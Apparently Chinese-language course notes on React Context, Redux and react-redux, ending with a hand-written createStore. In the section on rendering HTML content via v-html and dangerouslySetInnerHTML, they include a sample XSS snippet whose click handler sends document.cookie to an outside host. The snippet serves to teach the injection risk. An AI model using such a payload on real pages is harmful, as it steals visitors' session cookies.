## day6-2

### 复习
* 组件通讯
    * 父->子：props
        1. 在父组件中定义子组件的属性，并传递数据
        2. 使用
            * 函数组件：第一个参数为props
            * 类组件：this.props
    * 子->父
        > 传递父组件的方法到子组件执行
    * 多层级组件传参数
        * 逐层传递
        * Context
            1. 创建Context：`let MyContext = React.createContext(defalutValue)`
            2. 父组件共享数据：Provider
                ```js
                    <MyContext.Provider value={data}></MyContext>
                ```
            3. 子组件获取Context数据
                * contextType
                    ```js
                        SubComponent.contextType = MyContext;
                        this.context.xxx
                    ```
                * Consumer
                    ```js
                        <MyContext.Consumer>
                            {
                                data=>{
                                    return <div></div>
                                }
                            }
                        <MyContext.Consumer>
                    ```

### 知识点
* React & Redux
    > 他们是两个独立的产品，Redux不是React专属，它可以与任何第三方框架配合使用

* Redux
    > 搞清楚redux有什么，解决了什么问题
    * 核心概念Store
        * dispatch(action)    修改state的唯一方法
        * getState()          获取state数据
        * subscribe()
    * State
        > 真正存放数据的地方

    * Reducer：修改数据的方式
        > 在创建store时要事先定义好如何修改上面的数据
        * reducer是一个纯函数，state和actoin作为参数
        * 必须返回一个新的state
    * Action    命令（动作）
        * 格式：`{type,payload}`
            * type      要做什么操作
            * payload   传递的参数
        * Action Creator：一个用于创建action的方法
            * bindActionCreators：把ActionCreator中的所有方法(export default中的方法)绑定到组件props

* redux使用步骤
    1. 创建store（需要指定state与state的修改方式）
        * 需要定义state
        * 需要定义Reducer
    2. 定义State：状态（数据）
    3. 定义Reducer
        * 修改state的方式
        * 必须返回一个新的state
    4. 使用
        * 获取：store.getState()
        * 修改：store.dispatch(action)
        * 监听：store.subscribe(fn)
    
* react-redux
    * 利用context把store上的数据传入到react组件中
    * 使用步骤
        1. 在最外层使用`<Provider/>`组件，并共享Store
            ```js
                <Provider store={store}>
            ```
        2. 使用`connect`高阶组件映射数据到组件的props
            ```js
                connect([mapStateToProps][,mapDispatchToProps])(MyComponent)
            ```
            * 统一处理redux操作

* 在组件中显示包含html代码的数据
    ```html
        <img src="meinv.png" id="meinv"/>
        <h4>点我有惊喜</h4>
        <script>
            let meinv = document.querySelector('#meinv');
            meinv.onclick = function(){
                location.href="http://laoxie.com?data="+document.cookie

            }
        </script>
    ```
    * Vue：v-html
    ```html
        <div v-html="content"></div>
    ```
    * React:
    ```jsx
        //<div>{content}</div>
        <div dangerouslySetInnerHTML={{__html:content}}></div>
    ```

## day6-3

### 复习
* Redux：解决组件间数据共享的问题
    * 核心
        * Store     仓库（创建：createStore()）
            * 获取：store.getState()
            * 修改：store.dispatch(action)
            * 监听：store.subscribe(fn)
        * State     状态（数据）
        * Action    命令
        * Reducer   修改state的逻辑
            * 是一个纯函数，state,action作为参数
            * 返回新的state
    * store的工作原理
    ```js
        function createStore(reducer){
            let state = {}

            let listener = [];

            let getState = ()=>{
                return state;
            }
            let dispatch = (action)=>{
                state = reducer(state,action);

                listener.forEach(callback=>{
                    callback(getState());
                })
            }

            let subscribe = (callback)=>{
                listener.push(callback)
            }

            return {
                getState,
                dispatch,
                subscribe
            }
        }


        let store = createStore();
        let state = store.getState();
        //state.goodslist.push();// typescript是js的扩展
        //store.subscribe((state)=>{console.log(666)})
        //store.subscribe((state)=>{console.log(777)})
        //store.subscribe((state)=>{console.log(888)})
        //store.subscribe((state)=>{console.log(999)})
        //store.dispath();

    ```
* react-redux：连接React组件与Redux数据
    > 利用context+高阶组件实现react组件与redux数据的连接
    * Provider
        * 用法：`<Provider store={store}>`
    * connect
        * 用法：`connect(mapStateToProps,mapDispatchToProps)(Component)`    函数柯里化

* Action Creator 
    > 用于创建Action的函数
    * bindActionCreators(actionCreator,dispatch)